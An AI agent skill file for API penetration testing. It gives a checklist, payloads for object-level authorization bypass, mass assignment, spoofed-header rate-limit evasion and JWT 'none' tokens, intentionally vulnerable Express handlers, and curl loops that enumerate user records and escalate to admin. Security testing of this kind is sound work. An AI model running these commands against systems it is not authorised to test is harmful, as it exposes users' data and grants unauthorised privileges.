---
name: hunt-api
description: API Security hunting — BOLA, mass assignment, rate limiting bypass. Use when testing for API vulnerabilities, when user mentions REST API security, or when analyzing API endpoints. Includes authentication bypass and data exposure.
---

# 🎯 API Security Hunting Skill

Elite-level API vulnerability detection and exploitation.

## Detection Checklist

### BOLA (Broken Object Level Authorization)
- [ ] Test IDOR on API endpoints
- [ ] Test path traversal in API paths
- [ ] Test parameter pollution
- [ ] Test JWT/Token manipulation

### Mass Assignment
- [ ] Test adding extra parameters
- [ ] Test modifying read-only fields
- [ ] Test privilege escalation via parameters
- [ ] Test role manipulation

### Rate Limiting
- [ ] Test rate limit bypass
- [ ] Test IP rotation
- [ ] Test header manipulation
- [ ] Test request splitting

## Payloads

### BOLA Testing
```bash
# Sequential IDs
GET /api/v1/users/1
GET /api/v1/users/2
GET /api/v1/users/3

# UUID manipulation
GET /api/v1/users/550e8400-e29b-41d4-a716-446655440000

# Path traversal
GET /api/v1/users/../admin/users
GET /api/v1/users/..%2fadmin%2fusers
```

### Mass Assignment
```json
// Normal request
{
  "name": "John",
  "email": "john@example.com"
}

// With extra parameters
{
  "name": "John",
  "email": "john@example.com",
  "role": "admin",
  "is_verified": true,
  "balance": 1000000
}
```

### Rate Limiting Bypass
```bash
# IP rotation via headers
X-Forwarded-For: 1.1.1.1
X-Real-IP: 2.2.2.2
X-Client-IP: 3.3.3.3
X-Originating-IP: 4.4.4.4

# Request splitting
GET /api/v1/data HTTP/1.1\r\nHost: target.com\r\n\r\nGET /api/v1/data

# HTTP/2 downgrade
curl --http2-prior-knowledge https://target.com/api/v1/data
```

### Authentication Bypass
```bash
# Remove authentication
GET /api/v1/admin/users

# Empty token
Authorization: Bearer 

# Invalid token
Authorization: Bearer invalid

# JWT none algorithm
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0...
```

## Testing Methodology

1. **Map all API endpoints** — /api/v1, /v2, /graphql
2. **Test BOLA** — can you access other users' data?
3. **Test mass assignment** — can you modify privileged fields?
4. **Test rate limiting** — can you bypass restrictions?
5. **Test authentication** — can you access without credentials?
6. **Test authorization** — can you escalate privileges?

## Tools
- `Postman` — API testing
- `Burp Suite` — Manual testing
- `OWASP ZAP` — Automated scanning
- `crAPI` — Vulnerable API for testing

## Common Vulnerable Patterns
```javascript
// BOLA
app.get('/api/users/:id', (req, res) => {
  const user = db.users.findById(req.params.id);  // No auth check
  res.json(user);
});

// Mass assignment
app.post('/api/users', (req, res) => {
  const user = db.users.create(req.body);  // No field filtering
  res.json(user);
});

// Rate limiting bypass
app.get('/api/data', (req, res) => {
  const ip = req.headers['x-forwarded-for'];  // Spoofable
  if (rateLimit[ip] > 100) return res.status(429).json({error: 'Too many requests'});
  res.json(data);
});
```

## Impact Escalation
```bash
# Enumerate all users
for i in $(seq 1 1000); do
  curl -s "https://target.com/api/users/$i" -H "Authorization: Bearer $TOKEN" > "user_$i.json"
done

# Privilege escalation
curl -X POST "https://target.com/api/users/me" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"role": "admin"}'

# Rate limit bypass
for i in $(seq 1 1000); do
  curl -s "https://target.com/api/data" \
    -H "X-Forwarded-For: $((i % 255)).$((i / 255)).$((i / 65025)).$((i / 16581375))" &
done
wait
```
